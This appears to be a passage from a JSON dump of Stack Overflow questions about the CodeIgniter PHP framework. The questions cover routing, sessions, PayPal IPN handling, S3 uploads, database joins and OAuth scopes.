/test/index.php?/$1 [L]\n\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>my config.php is:</p>\n\n<p>$config['base_url'] = 'http://www.mydomain.com/test/';</p>\n\n<p>$config['index_page'] = \"\";</p>\n\n<p>$config['uri_protocol'] = \"AUTO\"; </p>\n"}]}
{"total":13987,"page":12,"pagesize":100,"questions":[{"tags":["php","codeigniter","controller"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":12754295,"title":"Codeigniter not showing pages","body":"<p>I have made a codigniter controller named 'Controller' which I have set us the default controller, however when i try to access a different function inside that controller eg. blog it just shows the home page...</p>\n\n<p>I haven't made any router changes apart from the default controller.</p>\n\n<p>Please help.</p>\n"},{"tags":["php","codeigniter","uri","userdata"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12439966,"title":"Can't use the method return value in write context","body":"<p>I'm using codeigniter and trying to make an if statement for if the controllers have changed. What I have right now gives the error.</p>\n\n<pre><code>if (isset($this-&gt;session-&gt;userdata('lastUrl')) &amp;&amp; $this-&gt;session-&gt;userdata('lastUrl') != $this-&gt;router-&gt;class) {\n     echo 'new controller';\n}\n\n$this-&gt;session-&gt;set_userdata('lastUrl', $this-&gt;router-&gt;class);\n</code></pre>\n\n<p>This code is in the constructor of the controller so it will be run on every page.</p>\n"},{"tags":["php","codeigniter","user-registration"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":351,"score":0,"question_id":7568532,"title":"Codeigniter Signup Controller code review","body":"<p>I just started using a MVC framework, especially Codeigniter and i am having some trouble maintaining my code and where to place my functions(controller or model).</p>\n\n<p>For now i am building a sign up system and i have a controller with the name <strong>signup.php</strong></p>\n\n<p>This is my code:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nClass Signup extends CI_Controller {\n\n    public function __construct()\n    {\n        parent::__construct();\n    }\n\n    public function index()\n    {\n        $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|callback_check_valid_username|min_length[6]|max_length[20]|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email');\n        $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|min_length[6]|max_length[32]');\n\n        if ($this-&gt;form_validation-&gt;run() == false){\n            $this-&gt;load-&gt;view(\"register/index\");\n        }else{\n            $this-&gt;submitRegistration();\n        }\n    }\n\n    public function ajaxup(){\n        if ($this-&gt;input-&gt;isAjaxRequest()){\n            header('Content-type: application/json');\n\n            $error = false;\n            $message = '';\n\n            $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|callback_check_valid_username|min_length[6]|max_length[20]|xss_clean');\n            $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email');\n            $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|min_length[6]|max_length[32]');\n\n            if ($this-&gt;form_validation-&gt;run() == false){\n                $message = validation_errors();\n                $error = true;\n            }else{\n                $this-&gt;_submitRegistration();\n                $message = 'Successfully registered.';\n            }\n\n            $return = array(\n                'error' =&gt; $error,\n                'message' =&gt; $message\n            );\n\n            $return = json_encode($return);\n\n            echo $return;\n\n        }\n    }\n\n    public function _submitRegistration(){\n        $username = $this-&gt;input-&gt;post('username');\n        $email = $this-&gt;input-&gt;post('email');\n        $password = $this-&gt;input-&gt;post('password');\n\n        $data = array(\n            'username' =&gt; $username,\n            'email'    =&gt; $email,\n            'password' =&gt; $password\n        );\n\n        $this-&gt;load-&gt;model('users_model');\n\n        $this-&gt;users_model-&gt;register_user($data);\n    }\n\n    public function check_valid_username($username){\n\n        $this-&gt;load-&gt;model('users_model');\n\n        if (!$this-&gt;users_model-&gt;is_valid_username($username)){\n            $this-&gt;form_validation-&gt;set_message('check_valid_username', 'The %s field should contain only letters, numbers or periods');\n            return false;\n        }\n\n        return true;\n\n    }\n\n}\n</code></pre>\n\n<p>Is there anything i could write better to maintain my code and be readable?</p>\n\n<p>*<em>NOTE:</em>*the function ajaxup is used when a user clicks the button and does an ajax call.</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","directory-structure"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":96,"score":4,"question_id":7543409,"title":"How to use folders in Codeigniter?","body":"<p>I'm just starting with Codeigniter. I created a simple controller called home.php and a view called home_view.php. This is working fine. Now I would eventually like this site I'm building to have a admin section in addition to the public www version. So I reorganized my file structure like so:</p>\n\n<pre><code>controllers:\n\nwww\n - home.php\nadmin\n\nViews:\n\nwww\n - home_view.php\nadmin\n</code></pre>\n\n<p>Eventually I will put the admin related controllers and views in their respective directories. But after having moved my files like so, they no longer work. I think I need to changes something in the routes or config file. What do I have to do?</p>\n"},{"tags":["php","mysql","session","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":263,"score":0,"question_id":7721148,"title":"Store codeigniter shopping cart","body":"<p>Ive already finish creating the shopping cart in codeigniter using shopping cart class. but the data was stored in session in array then i want to store the session array in database user_ordered. with userid, productid, qty. or other values. </p>\n"},{"tags":["php","codeigniter","paypal","paypal-ipn","codeigniter-2"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":654,"score":1,"question_id":4888436,"title":"PayPal IPN, lots of sign ups, one payment, all in the wrong order","body":"<p>I've recently implemented a PayPal IPN into CodeIgniter2, using the <a href=\"http://codeigniter.com/wiki/PayPal_Lib/\" rel=\"nofollow\">PayPal Lib</a>.  I'm using the system for subscriptions.</p>\n\n<p>I have a table in my database that records all IPN requests in the database.  </p>\n\n<p>For some reason, after every sign up the IPN requests aren't coming through properly.  I tend to get one subscr_payment along with several subscr_signups, all with the same subscr_id.  It's causing untolds amount of hassle within the system, for obvious reasons.  What adds to this, is the fact that the IPN requests don't come in the correct order, sometimes I get the subscr_payment before the subscr_signup - making it impossible to track as there's no subscr_id from the sign up to link it to a user.</p>\n\n<p>I've had a Google and can't find much on this, I seem to be a little bit of an anomaly.  I'm wondering if it's something to do with the PayPal Lib I'm using, but I don't really want to have to do it outside of CodeIgniter, as I am doing a lot of processing.  Below is the full IPN script.</p>\n\n<p><code>\nclass Paypal extends CI_Controller {\n    function _<em>construct()\n        {\n        parent::</em>_construct();\n        $this->load->library('paypal_lib');\n    }</p>\n\n<pre><code>function ipn()\n{\n\n    $this-&gt;output-&gt;enable_profiler(TRUE);\n\n    $this-&gt;load-&gt;model('payments_model');\n    $this-&gt;load-&gt;model('paypal_model');\n    $this-&gt;load-&gt;model('users_model');\n\n    ob_start();\n\n    if ($this-&gt;paypal_lib-&gt;validate_ipn()) \n    {\n\n\n            $paypal_id = $this-&gt;paypal_model-&gt;add_paypal_ipn($this-&gt;paypal_lib-&gt;ipn_data);\n            // Split the 'custom' field up, containing ID of temp user, ID of package and coupon\n            $custom = explode(';', $this-&gt;paypal_lib-&gt;ipn_data['custom']);\n\n            ###\n            # subscription sign up\n            ###\n            if($this-&gt;paypal_lib-&gt;ipn_data['txn_type'] == 'subscr_signup') {\n                // Activate user/move from temp &gt; live\n                $this-&gt;users_model-&gt;move_temp($custom[0], $this-&gt;paypal_lib-&gt;ipn_data['subscr_id']);\n            } # end subscr_signup\n\n\n            ###\n            # subscription payment\n            ###\n            if($this-&gt;paypal_lib-&gt;ipn_data['txn_type'] == 'subscr_payment') {\n                // Grab the coupon info, if we have one\n                $discount = 1;\n                if(!empty($custom[2])){\n                    $this-&gt;load-&gt;model('coupons_model');\n                    $couponinfo = $this-&gt;coupons_model-&gt;get_coupon($custom[2]);\n                    $discount = $couponinfo-&gt;discount;\n                }                    \n                // Grab the package info\n                $package = $this-&gt;packages_model-&gt;get_package($custom[1]);\n                $price = $package-&gt;monthly * $discount; // Calculate discount, 0.8 = 20% off\n\n                // Does the price calculated match the gross price?  If not something fishy is going on, block it\n                if($price != $this-&gt;paypal_lib-&gt;ipn_data['mc_gross']){\n                    mail(CONTACT_EMAIL, SITE_NAME.' failed payment attempt, possible hack', 'Price paid doesnt match price computed... paid: '.$this-&gt;paypal_lib-&gt;ipn_data['mc_gross'].' - price worked out: '.$price.\"\\n\\n\".print_r($this-&gt;paypal_lib-&gt;ipn_data, true));\n                    exit;\n                }\n\n                // Grab the user's details based on the subscr_id\n                $user = $this-&gt;users_model-&gt;get_user_by_subscr_id($this-&gt;paypal_lib-&gt;ipn_data['subscr_id']);\n\n                // Add payment to the payments table\n                $data = array(\n                    'user_id' =&gt; $user-&gt;user_id,\n                    'subscr_id' =&gt; $user-&gt;subscr_id,\n                    'txn_id' =&gt; $this-&gt;paypal_lib-&gt;ipn_data['txn_id'],\n                    'amount' =&gt; $this-&gt;paypal_lib-&gt;ipn_data['mc_gross'],\n                    'package_id' =&gt; $custom[1],\n                    'coupon' =&gt; (empty($custom[2]) ? '' : $custom[2])\n                );\n                $this-&gt;payments_model-&gt;add_payment($data);\n\n                // Set (forced) user as active, and update their current active package\n                $data1 = array(\n                    'package_id' =&gt; $custom[1],\n                    'active' =&gt; 1\n                );\n                $this-&gt;users_model-&gt;update_user($data1, $user-&gt;user_id);\n            } # end subscr_payment\n\n\n            ###\n            # subscription failed/cancelled\n            ###\n            if($this-&gt;paypal_lib-&gt;ipn_data['txn_type'] == 'subscr_cancel' || $this-&gt;paypal_lib-&gt;ipn_data['txn_type'] == 'subscr_failed') {\n                // Grab user\n                $user = $this-&gt;users_model-&gt;get_user_by_subscr_id($this-&gt;paypal_lib-&gt;ipn_data['subscr_id']);\n\n                // Make user inactive\n                $data = array('active' =&gt; 0);\n                $this-&gt;users_model-&gt;update_user($data, $user-&gt;user_id);\n            } # end subscr_cancel|subscr_failed\n\n\n\n\n\n            ###\n            # subscription modified/payment changed\n            ###\n            if($this-&gt;paypal_lib-&gt;ipn_data['txn_type'] == 'subscr_modify') {\n                // Grab the coupon info, if we have one\n                $discount = 1;\n                if(!empty($custom[2])){\n                    $this-&gt;load-&gt;model('coupons_model');\n                    $couponinfo = $this-&gt;coupons_model-&gt;get_coupon($custom[2]);\n                    $discount = $couponinfo-&gt;discount;\n                }                    \n                // Grab the package info\n                $package = $this-&gt;packages_model-&gt;get_package($custom[1]);\n                $price = $package-&gt;monthly * $discount; // Calculate discount, 0.8 = 20% off\n\n                // Does the price calculated match the gross price?  If not something fishy is going on, block it\n                if($price != $this-&gt;paypal_lib-&gt;ipn_data['mc_gross']){\n                    mail(CONTACT_EMAIL, SITE_NAME.' failed payment attempt, possible hack', 'Price paid doesnt match price computed... paid: '.$this-&gt;paypal_lib-&gt;ipn_data['mc_gross'].' - price worked out: '.$price.\"\\n\\n\".print_r($this-&gt;paypal_lib-&gt;ipn_data, true));\n                    exit;\n                }\n\n                // Grab the user's details based on the subscr_id\n                $user = $this-&gt;users_model-&gt;get_user_by_subscr_id($this-&gt;paypal_lib-&gt;ipn_data['subscr_id']);\n\n                // Add payment to the payments table\n                $data = array(\n                    'user_id' =&gt; $user-&gt;user_id,\n                    'subscr_id' =&gt; $user-&gt;subscr_id,\n                    'txn_id' =&gt; $this-&gt;paypal_lib-&gt;ipn_data['txn_id'],\n                    'amount' =&gt; $this-&gt;paypal_lib-&gt;ipn_data['mc_gross'],\n                    'package_id' =&gt; $custom[1],\n                    'coupon' =&gt; (empty($custom[2]) ? '' : $custom[2])\n                );\n                $this-&gt;payments_model-&gt;add_payment($data);\n\n                // Set (forced) user as active, and update their current active package\n                $data1 = array(\n                    'package_id' =&gt; $custom[1],\n                    'active' =&gt; 1\n                );\n                $this-&gt;users_model-&gt;update_user($data1, $user-&gt;user_id);\n            } # end subscr_modify\n\n    }\n}\n</code></pre>\n\n<p></code></p>\n\n<p>Below is an example of the calls made to my IPN for each transaction (CSV).</p>\n\n<pre><code>paypal_id,txn_id,subscr_id,txn_type,created\n1,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:19:43\n2,9XM95194MM564230E,I-FMUK0B5KJWKA,subscr_payment,2011-02-03 16:19:45\n3,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:19:57\n4,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:20:19\n6,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:21:03\n7,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:22:25\n8,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:25:08\n10,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:30:33\n12,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 16:41:16\n14,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 17:02:42\n16,NULL,I-FMUK0B5KJWKA,subscr_signup,2011-02-03 17:45:26\n</code></pre>\n"},{"tags":["php","codeigniter","file-upload","amazon-s3","image-uploading"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12661688,"title":"codeigniter s3 image upload works locally but not on production","body":"<p>I have a model called <strong>photos_model.php</strong> which does the backend work to upload images to s3</p>\n\n<p>here is the function that uploads to s3</p>\n\n<pre><code>public function uploadPhoto($photo){\n    $this-&gt;load-&gt;model(\"misc_model\");\n\n    //required vars\n    $tmp_name = $photo[\"tmp_name\"];\n    $name = $photo[\"name\"];\n    $type = $photo[\"type\"];\n    $size = $photo[\"size\"];\n    $error_upload = $photo[\"error\"];\n\n\n    $random_str = $this-&gt;misc_model-&gt;generateRandomNumber(20, true, true);\n\n    $this-&gt;s3-&gt;putBucket($this-&gt;config-&gt;item(\"bucket\"), S3::ACL_PUBLIC_READ);\n\n    if($this-&gt;s3-&gt;putObjectFile($tmp_name, $this-&gt;config-&gt;item(\"bucket\") , 'photos/'.$random_str.\".jpg\", S3::ACL_PUBLIC_READ) ){\n        echo 'ok';\n    }else{\n        echo 'fail';\n    }\n\n}\n</code></pre>\n\n<p><strong>the s3 library:</strong></p>\n\n<p>taken from here <a href=\"http://net.tutsplus.com/tutorials/php/how-to-use-amazon-s3-php-to-dynamically-store-and-manage-files-with-ease/\" rel=\"nofollow\">http://net.tutsplus.com/tutorials/php/how-to-use-amazon-s3-php-to-dynamically-store-and-manage-files-with-ease/</a></p>\n\n<p>this will work on my local machine MAC OS X Lion</p>\n\n<p>but when i try the script on an <strong>amazon ec2 machine</strong> it simply doesnt print anything... like nothing...</p>\n"},{"tags":["php","codeigniter","join","left-join"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12752442,"title":"codeigniter join multiple rows where","body":"<p>I'm trying to code a search function for a site written on CodeIgniter but have trouble with the join statement in the model. </p>\n\n<p>A controller passes an array of search criteria to the model function: get_sales($search_criteria); </p>\n\n<pre><code>function get_sales($search_criterie){\n\n    $this-&gt;db-&gt;join('sales_prices', 'sales_prices.sale_id = sales.sale_id', 'left');\n    $this-&gt;db-&gt;join('sales_sizes', 'sales_sizes.sale_id = sales.sale_id', 'left');\n    $query = $this-&gt;db-&gt;get_where('sales', $search_criterie);\n    $sale_data = $query-&gt;result_array();\n\n}\n</code></pre>\n\n<p>I'm running into two problems:</p>\n\n<p>1) I need a WHERE clause in the sales_sizes join. Right now it joins sales_sizes.sale_id ON sales.sale_id but I want to be able to filter by size via the $search_criteria array. How can I do this?</p>\n\n<p>2) Every sales usually has multiple sizes and I want the output of the query formatted like:</p>\n\n<pre><code>Array\n(\n    [sale_id] =&gt; 1\n    [sale_category] =&gt; shoes\n    [sale_price] =&gt; 29.99\n    [sale_sizes] =&gt; Array\n        (\n            [0] =&gt; 10\n            [1] =&gt; 10.5\n            [2] =&gt; 11\n\n        )\n\n)\n</code></pre>\n\n<p>I've tried some foreach loops to format the output but can't get it to work. Hope somebody can help.</p>\n\n<p>Update:</p>\n\n<p>How do I process the following query result into a format like the one above?</p>\n\n<pre><code>Array\n(\n    [0] =&gt; Array\n        (\n            [sale_id] =&gt; 1\n            [sale_category] =&gt; shoes\n            [sale_price] =&gt; 29.99\n            [sale_size] =&gt; 10\n        )\n\n    [1] =&gt; Array\n        (\n            [sale_id] =&gt; 1\n            [sale_category] =&gt; shoes\n            [sale_price] =&gt; 29.99\n            [sale_size] =&gt; 10.5\n        )\n\n    [2] =&gt; Array\n        (\n            [sale_id] =&gt; 1\n            [sale_category] =&gt; shoes\n            [sale_price] =&gt; 29.99\n            [sale_size] =&gt; 11    \n        )\n\n) \n</code></pre>\n"},{"tags":["php","codeigniter","godaddy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12742491,"title":"Godaddy not logging errors to CI logs","body":"<p>After uploading a site built with codeigniter to a goddaddy vps server, I had some issues with database errors and php errors, but there errors are not being logged in the Codeigniter log folder even after setting the log_threshold to 4(All messages) and makeing the folder writable, the logs are showing up in the folder.\nWhat could be the problem</p>\n"},{"tags":["codeigniter","pdf","download"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12725012,"title":"pdf document error on download","body":"<p>Hello I have some pdf files in my website which the users can download but the problem is when  we download these pdf file and try to open the pdf I get an error \" There was an error in opening the document. The file is damaged and could not be repaired\" but on the contarary this works fine in my local system.\nPlease guide me , Here is my code</p>\n\n<pre><code>function download_pdf($parameters)\n{\n\n    $final_link = \"$parameters\";\n    $path = strtolower($final_link);\n    $file = \"$path\";\n\n        if (file_exists($file)) {\n            header('Content-Description: File Transfer');\n            header('Content-Type: application/octet-stream');\n            header('Content-Disposition: attachment;       filename='.basename($file));\n            header('Content-Transfer-Encoding: binary');\n            header('Expires: 0');\n            header('Cache-Control: must-revalidate');\n            header('Pragma: public');\n            header('Content-Length: ' . filesize($file));\n            ob_clean();\n            flush();\n            readfile($file);\n            exit;\n        }\n        else\n        {\n            //echo \"file do not exist\";\n            redirect('site/file_does_not_exist');\n            //$data['main_content'] = 'not_found';\n            //$this-&gt;load-&gt;view('includes/template',$data);\n        }\n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","codeigniter-datamapper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12715757,"title":"How to get table values ​​using array and conditions","body":"<p>I'm studying and decided to make a CodeIgniter application with backend and frontend for learning purposes and I came across the following doubts.\nWould you like to get all data from a table in the database and put in an array, after that I would like to display the data in column 2 when the value of column 1 is equal to the value I determine.</p>\n\n<p>To better illustrate what I'll give an example, look at the table below.</p>\n\n<pre><code>ID      Option              Value\n1       site_name           Test\n2       site_description    Example of description site.\n3       site_url            http://www.example.com\n4       site_author         John Doe\n5       site_lang           en\n</code></pre>\n\n<p>Now let's say I want to display this data on my page within the tag  for example I would use the \"site_name\", for a description of the site would be \"site_description\" and so on. What would be the best way to do this?</p>\n\n<p>PS: I'm using an ORM Datamapper this application, is there any way to simplify operation using it?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2287,"score":1,"question_id":6529026,"title":"CodeIgniter default controller in a sub directory not working","body":"<p>My default_controller in the routes configuration is set as \"home.php\".</p>\n\n<p>I have a sub directory for my controllers, lets call it \"folder\". So if I visit <a href=\"http://mysite.com/folder/\" rel=\"nofollow\">http://mysite.com/folder/</a>, the default controller \"folder/home.php\" should be called right?</p>\n\n<p>However for some reason this doesn't work, I get a 404. Visiting <a href=\"http://mysite.com/folder/home\" rel=\"nofollow\">http://mysite.com/folder/home</a> or <a href=\"http://mysite.com/folder/home/index\" rel=\"nofollow\">http://mysite.com/folder/home/index</a> works as expected. In addition to this, the default controller works in the root directory (http://mysite.com loads home.php).</p>\n\n<p>Any ideas, has anyone else experienced this? I can't get my head around it - it would appear to be a CI issue but I can't find anybody else having the same problem.</p>\n\n<p>The documentation, from the way I understand it at least, suggests that this should work fine: <a href=\"http://codeigniter.com/user_guide/general/controllers.html#subfolders\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/controllers.html#subfolders</a></p>\n\n<p>Setting the default controller to \"folder/home.php\" means that <a href=\"http://mysite.com/folder/\" rel=\"nofollow\">http://mysite.com/folder/</a> works fine as expected. Except for I want the default controller to just be \"home.php\" - whether in the root or in a sub directory, home.php within that directory should be loaded, as the documentation suggests.</p>\n\n<p>Cheers</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1686,"score":3,"question_id":8307705,"title":"CodeIgniter \"flashdata\" doesn't work","body":"<p>I use CodeIgniter 2.1.0, i want after insert data in database get a message like \"Your information was successfully updated.\". For this work i have in CI_Controller following function:</p>\n\n<pre><code>function myCiInser(){\n... Here is my query ...\n//$data: this var is result query that is true\nif($data){\n    $this -&gt; session -&gt; set_flashdata('message', 'Your information was successfully updated.');\n    redirect('url/myurl');\n            }\n}\n</code></pre>\n\n<p>And i have in view as:</p>\n\n<pre><code>&lt;?php\n$message = $this-&gt;session-&gt;flashdata('message');\n    if($message){\n        echo '&lt;div id=\"error_text\"&gt;' . $message . '&lt;/div&gt;';\n    }\n//I test this : \"echo $message;\" but don't give output\n?&gt;\n</code></pre>\n\n<p>But i don't give message in view but <code>redirect</code> is done and work true. and in database in table <code>ci_sessions</code> column <code>user_data</code> i have this:</p>\n\n<blockquote>\n  <p>a:2:{s:9:\"user_data\";s:0:\"\";s:19:\"flash:new:message\";s:42:\"Your\n  information was successfully updated.\";}</p>\n</blockquote>\n\n<p>How can fix this problem?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I had the following error (i use from chorme and by Ctrl+Shift+j i get this alert):</p>\n\n<blockquote>\n  <p>Failed to load resource: the server responded with a status of 404\n  (Not Found)</p>\n</blockquote>\n\n<p>And i fix it (Now i do not have the error) but still is same problem in display message. what do i do?</p>\n"},{"tags":["codeigniter","news"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":216,"score":2,"question_id":9956643,"title":"Codeigniter urls, doubled segment, like: news/news/","body":"<p>i have completed the well known 'news' toutorial included in CI documentation. sometimes double 'news/' segment occurs in my linking strings like this: '/codeig/news/news/entry' and sometimes after reloading page everything works right. i should mention i have got rid of 'index.php' segment following another popular tutorial. what is wrong with my code ?</p>\n\n<p>this is my routing:</p>\n\n<pre><code>$route['news/create'] = 'news/create'; \n$route['news/update/(:any)'] = 'news/update/$1';\n$route['news/delete/(:any)'] = 'news/delete/$1';\n$route['news/(:any)'] = 'news/view/$1';\n$route['news'] = 'news';\n$route['welcome'] = 'welcome';\n\n$route['auth/(:any)'] = 'auth/$1';\n$route['auth'] = 'auth';\n$route['activate/:num/:any'] = \"/auth/activate/$1/$2\";\n$route['reset_password/:num/:any'] = \"/auth/reset_password/$1/$2\";\n\n$route['(:any)'] = 'pages/view/$1';\n$route['default_controller'] = 'news';\n</code></pre>\n\n<p>views/news/index.php file:</p>\n\n<pre><code>&lt;?php foreach ($news as $news_item): ?&gt;\n\n&lt;h2&gt;&lt;?php echo $news_item['title'] ?&gt;&lt;/h2&gt;\n&lt;div id=\"main\"&gt;\n    &lt;?php echo $news_item['text'] ?&gt;\n&lt;/div&gt;\n&lt;p&gt;&lt;a href=\"news/&lt;?php echo $news_item['slug'] ?&gt;\"&gt;View article&lt;/a&gt;&lt;/p&gt;\n\n&lt;?php endforeach ?&gt;\n</code></pre>\n\n<p>view method (news controller)</p>\n\n<pre><code>public function view($slug)\n{\n$data['news_item'] = $this-&gt;news_model-&gt;get_news($slug);\n\nif (empty($data['news_item']))\n{\n    show_404();\n}\n\n$data['title'] = $data['news_item']['title'];\n\n$this-&gt;load-&gt;view('templates/header', $data);\n$this-&gt;load-&gt;view('news/view', $data);\n$this-&gt;load-&gt;view('templates/footer');\n}\n</code></pre>\n"},{"tags":["php","codeigniter","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12747598,"title":"Controllers slugs","body":"<p>I'm planing to develop mid size website. I want to use  SEO friendly url's like</p>\n\n<pre><code>http://foobar.com/category/fun/\nhttp://foobar.com/article/lorem-ipsum.html\n</code></pre>\n\n<p>As you can see I want to use slugs for controllers names.\nI intend to implement it in the following way.</p>\n\n<p>One file to handle all requests.</p>\n\n<p>In routes.php</p>\n\n<pre><code>$route['(:any)'] = 'my_routes/$1';\n</code></pre>\n\n<p>And then in my_routes with $this->uri->segment I can determinate which controller is requested.</p>\n\n<p>Is it good idea to use just one file (my_routes) for entire website ?</p>\n\n<p>Can you recommend me some better solution ?</p>\n"},{"tags":["php","codeigniter","join"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":10994213,"title":"CodeIgniter join returns last row","body":"<p>I have two tables:</p>\n\n<pre><code>orders: \norderid      customer_id amount\n1       5           1\n2       5           2\n3       8           3\n4       5           11\n5       8           45\n6       11          23\n7       11          2\n\norders_items:\nid      orderid      item    quantity\n1       1           'item1'     1\n2       1           'item2'     2\n3       2           'item1'     1 \n4       3           'item1'     3\n5       3           'item2'     1 \n6       3           'item3'     1\n</code></pre>\n\n<p>Now I would like to get the infomation of every order including all the different items per order.\nI use:</p>\n\n<pre><code> $this-&gt;db-&gt;select()-&gt;from('orders')-&gt;join('orders_items', 'orders.orderid = orders_items.orderid' );\n    $query = $this-&gt;db-&gt;get();\n    $result_array = $query-&gt;result_array();\n</code></pre>\n\n<p>This however gives me the array with only the last item for every order. What am I doing wrong?\nMy final array should be something like this: </p>\n\n<pre><code>Array\n(\n    [0] =&gt; Array\n        (\n            [orderid] =&gt; 49\n            [customerid] =&gt; 2\n            [amount] =&gt; 438.00\n            [id] =&gt; 63\n            array(\n               array(\n                 [item] =&gt; Service1\n                 [quantity] =&gt; 22\n                 [subtotal] =&gt; 439\n                    ),\n               array(\n                 [item] =&gt; Service2\n                 [quantity] =&gt; 22\n                 [subtotal] =&gt; 439\n                    )\n                 )\n        )\n</code></pre>\n\n<p>How should I do this?</p>\n"},{"tags":["codeigniter","module","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12746027,"title":"hmvc, modular seperation, modular extension, concept clarification","body":"<p>I've been reading about modules for codeigniter for quite a while and have decided to dive into it. I've gotten the basic concept, each module is a seperate \"MVC\", hence ease in maintaining, adding, etc, but need a little help understanding proper implementation.</p>\n\n<p>Firstly, specifically I'd like an explanataion for the line in original modular extension hmvc site</p>\n\n<p>\"To use Modular Separation only, without HMVC, controllers will extend the CodeIgniter Controller class.\"</p>\n\n<p>what excatly does this mean? if someone could explain it's meaning and purpose it would be really helpful.</p>\n\n<p>Also, a little more conceptual explanation of HMVC, modular extension and seperation etc would be great. Like how to decide when to extend modules, seperate them, and what excatly this means.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12345798,"title":"Space validation in full name field","body":"<p>I want to place check in Full name field that full name field should accept space between first and last name using i am using <code>strrpos()</code> function for it but not working </p>\n"},{"tags":["php","codeigniter","mongodb","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12410483,"title":"CodeIgniter + MongoDB Update","body":"<p>I'm trying to use the library <a href=\"https://github.com/alexbilbie/codeigniter-mongodb-library\" rel=\"nofollow\">codeigniter-library-mongodb</a> nested in a collection. But I am not able to do updates ...</p>\n\n<p>To query I am using the following code:</p>\n\n<pre><code>getFacebookUser function ($ id ='') {\n   return $ this-&gt; mongo_db-&gt; get_where ('users', array ('facebook.id' =&gt; $ id));\n}\n</code></pre>\n\n<p>To insert:</p>\n\n<pre><code>createFacebookUser function ($ id ='', $ acess_token ='') {\n   $user = array (\n     'facebook' =&gt; array (\n       'id' =&gt; $ id,\n       'acess_token' =&gt; $ acess_token\n     )\n   );\n   $ this-&gt; mongo_db-&gt; insert ('users', $ user);\n}\n</code></pre>\n\n<p>I tried using the following code:</p>\n\n<pre><code>updateFacebookUser function ($ id ='', $ acess_token ='') {\n    $ this-&gt; mongo_db-&gt; update ('users', array ('facebook.acess_token' =&gt; $ acess_token), array ('facebook.id' =&gt; $ id));\n}\n</code></pre>\n\n<p>But I am getting the following message:</p>\n\n<p>Nothing to update in Mongo collection or update is not an array</p>\n\n<p>The structure I'm using is the following:</p>\n\n<pre><code>user {\n     name,\n     {facebook\n         id,\n         acess_token\n     }\n     {twitter\n        id,\n        acess_token\n     }\n}\n</code></pre>\n"},{"tags":["codeigniter","oauth","kohana","linkedin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12745463,"title":"codeigniter's oauth sparks issue with linkedin Scope.","body":"<p>I'm using <a href=\"https://github.com/philsturgeon/codeigniter-oauth\" rel=\"nofollow\">Oauth</a> from sparks which is derived from kohana's <a href=\"https://github.com/kohana/oauth\" rel=\"nofollow\">Oauth</a> implementation.<br>\n  I'm suceesfully able to fetch basic information from linkeidn but after adding  \"r_emailaddress\" scope I do not get email-address only basic info is being fetch.<br>\n  I'm adding scope follwong way in my controller </p>\n\n<pre><code>$consumer = $this-&gt;oauth-&gt;consumer(array(\n            'key' =&gt; $config[$provider]['key'],\n            'secret' =&gt; $config[$provider]['secret'],\n            'scope'=&gt; \"r_emailaddress,r_fullprofile\"\n          ));\n</code></pre>\n\n<p>Any Clue would be apreciated. 